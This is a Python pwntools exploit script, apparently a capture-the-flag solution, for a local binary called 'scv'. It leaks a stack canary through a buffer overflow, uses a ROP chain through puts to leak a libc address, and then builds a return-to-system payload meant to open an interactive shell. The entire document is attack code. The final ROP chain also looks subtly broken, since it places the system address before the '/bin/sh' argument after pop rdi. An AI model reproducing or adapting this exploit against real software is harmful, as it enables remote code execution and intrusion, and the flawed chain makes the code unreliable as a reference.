
from pwn import *

r=process('./scv')

###############gadjets###########################
pop_rdi = p64(0x00400ea3) 
puts_plt = p64(0x4008d0)
puts_got = p64(0x602018)
#read_got = p64(0x602030)
main = p64(0x0000000000400a96)

####################LEAK CANARY#####################
r.recvuntil(">>")
r.sendline("1")
r.recvuntil(">>")
r.send("A"*168+"\x01")

r.recvuntil(">>")
r.sendline("2")
r.recvuntil("A"*168)

canary = u64(r.recvline()[0:8])-1

log.info("Canary:"+hex(canary))

######################LEAK LIBC#################################
r.recvuntil(">>")
r.sendline("1")
r.recvuntil(">>")

payload1= "A"*168
payload1 += p64(canary)
payload1 += "B"*8
payload1 += pop_rdi
payload1 += puts_got
payload1 += puts_plt
payload1 += main

r.send(payload1)

r.recvuntil(">>")
r.sendline("3")
#print r.recvline()


r.recvuntil("[*]BYE ~ TIME TO MINE MIENRALS...\n")
leak_addr= r.recvline().replace("\n","")
puts_libc_leak = u64(leak_addr + "\x00"*(8-len(leak_addr))) 
log.info("Libc Puts address:"+hex(puts_libc_leak))

######################BASE###############################
system_offset = 0x04f4e0
puts_offset = 0x80a30
str_bin_sh = 0x1b40fa

base = puts_libc_leak - puts_offset
system_libc = system_offset + base
bin_sh_libc = str_bin_sh + base

payload2 = ''
payload2 += "A" *168
payload2 += p64(canary)
payload2 += "A" *8
payload2 += pop_rdi
payload2 += p64(system_libc)
payload2 += p64(bin_sh_libc)

r.recvuntil(">>")
r.sendline("1")
r.recvuntil(">>")
r.send(payload2)
r.recvuntil(">>")
r.sendline("3")
r.interactive()


